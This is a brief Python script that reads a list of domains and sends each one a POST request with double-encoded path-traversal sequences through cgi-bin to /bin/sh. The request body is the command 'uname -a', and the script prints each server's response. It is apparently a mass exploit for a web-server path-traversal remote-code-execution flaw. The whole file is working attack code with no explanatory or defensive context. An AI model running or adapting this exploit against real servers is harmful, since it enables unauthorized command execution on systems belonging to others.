import requests
import sys

fp = sys.argv[1]
d = "uname -a"


with open(fp, 'r') as file:
	for line in file:
		domain = line.strip()
		print(domain)
		target = r"http://" + domain + r"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65./%%32%65/bin/sh"
		try:
			response = requests.post(target, timeout=10, data=d)
			print(response.text)
		except Exception as E:
			print(E)
		print("=========================================================================================")
		print("")
